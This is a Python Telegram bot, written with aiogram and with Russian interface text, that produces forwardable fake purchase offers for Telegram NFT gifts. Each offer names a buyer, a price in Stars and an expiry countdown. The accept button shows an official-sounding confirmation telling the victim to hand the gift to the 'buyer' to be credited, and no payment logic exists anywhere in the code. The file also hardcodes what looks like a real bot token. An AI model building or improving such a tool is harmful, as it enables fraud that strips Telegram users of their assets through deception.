import asyncio
import logging
import re

from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode

BOT_TOKEN = "8850115069:AAHt8yX4-4gswis3VY4mmO2zj_ipBjkK2s4"  # вставь свой токен
current_buyer = "faqux"
DEFAULT_STARS = 7000

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


def parse_gift(text: str):
    m = re.search(r't\.me/nft/([A-Za-z0-9]+)-(\d+)', text)
    if not m:
        return None
    name, num = m.group(1), m.group(2)
    gift_name = re.sub(r'([a-z])([A-Z])', r'\1 \2', name)
    stars = DEFAULT_STARS
    for match in re.finditer(r'\b(\d{3,7})\b', text):
        val = int(match.group(1))
        if str(val) != num and 100 <= val <= 1000000:
            stars = val
            break
    slug = f"{name}-{num}"
    return {
        "gift_name": f"{gift_name} #{num}",
        "link": f"https://t.me/nft/{slug}",
        "stars": stars
    }


@dp.message()
async def on_msg(message: Message):
    text = message.text or ""
    gift = parse_gift(text)
    if not gift:
        await message.answer("Кинь ссылку t.me/nft/... и цену")
        return

    offer_text = (
        f"<b>Пользователь {current_buyer} предлагает Вам {gift['stars']} Stars за подарок "
        f"<a href=\"{gift['link']}\">{gift['gift_name']}</a>.</b>\n\n"
        f"Предложение действует ещё <b>5ч 59м</b>."
    )
    cb_data = f"acc|{gift['stars']}|{gift['gift_name'][:20]}"
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✗ Отклонить", callback_data="dec"),
        InlineKeyboardButton(text="✓ Принять", callback_data=cb_data)
    ]])

    await message.answer("Готово. Перешли ниже.")
    await message.answer(offer_text, reply_markup=kb, parse_mode=ParseMode.HTML)


@dp.callback_query(F.data == "dec")
async def on_dec(cb: CallbackQuery):
    await cb.answer("Предложение отклонено", show_alert=True)
    try:
        await cb.message.edit_text("Предложение отклонено.", reply_markup=None)
    except Exception:
        pass


@dp.callback_query(F.data.startswith("acc|"))
async def on_acc(cb: CallbackQuery):
    parts = cb.data.split("|", 2)
    stars = parts[1] if len(parts) > 1 else "7000"
    gift_name = parts[2] if len(parts) > 2 else "подарок"

    alert_text = (
        f"Предложение о продаже {gift_name} успешно принято.\n\n"
        f"Передайте подарок покупателю для зачисления {stars} Stars на ваш баланс."
    )
    await cb.answer(alert_text, show_alert=True)

    # Also update the message
    try:
        await cb.message.edit_text(
            f"<b>Предложение о продаже {gift_name} успешно принято.</b>\n\n"
            f"Передайте подарок покупателю для зачисления {stars} Stars на ваш баланс.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="Передать", url=f"https://t.me/{current_buyer}")
            ]]),
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass


async def main():
    print("Alert bot started")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
